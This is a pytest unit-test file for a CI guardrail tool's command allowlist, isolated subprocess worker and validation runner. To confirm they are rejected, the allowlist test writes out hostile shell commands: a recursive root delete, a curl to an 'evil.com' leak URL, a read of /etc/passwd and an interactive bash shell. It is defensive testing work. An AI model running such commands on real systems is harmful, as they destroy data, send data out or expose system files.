"""Unit tests for isolated validation workers and validation runner."""

from __future__ import annotations

from pathlib import Path

import pytest

from guardrail_ci.core.exceptions import ValidationError
from guardrail_ci.core.models import PatchFile, RemediationPlan
from guardrail_ci.validation.commands import is_command_allowlisted
from guardrail_ci.validation.runner import ValidationRunner
from guardrail_ci.validation.worker import IsolatedSubprocessWorker


def test_command_allowlist_enforcement() -> None:
    assert is_command_allowlisted("pytest") is True
    assert is_command_allowlisted("pytest -v") is True
    assert is_command_allowlisted("ruff check .") is True
    assert is_command_allowlisted("python -m unittest") is True

    # Dangerous or arbitrary shell commands must be rejected
    assert is_command_allowlisted("rm -rf /") is False
    assert is_command_allowlisted("curl https://evil.com/leak") is False
    assert is_command_allowlisted("cat /etc/passwd") is False
    assert is_command_allowlisted("bash -i") is False


def test_subprocess_worker_rejects_unlisted_command(tmp_path: Path) -> None:
    worker = IsolatedSubprocessWorker()
    with pytest.raises(ValidationError):
        worker.run_check("curl http://example.com", tmp_path)


def test_validation_runner_executes_plan(tmp_path: Path) -> None:
    # Prepare a minimal workspace with a passing test
    test_file = tmp_path / "test_sample.py"
    test_file.write_text("def test_ok():\n    assert True\n", encoding="utf-8")

    plan = RemediationPlan(
        description="Add helper",
        intended_effect="Verify validation runner",
        files=[
            PatchFile(
                path="helper.py",
                modified_content="VALUE = 42\n",
                diff="+VALUE = 42",
            )
        ],
    )

    worker = IsolatedSubprocessWorker()
    runner = ValidationRunner(worker)

    passed, results = runner.validate_plan(
        plan=plan,
        commands=["python -m unittest"],
        base_dir=tmp_path,
    )

    assert len(results) == 1
    assert results[0].command == "python -m unittest"
    assert passed is True
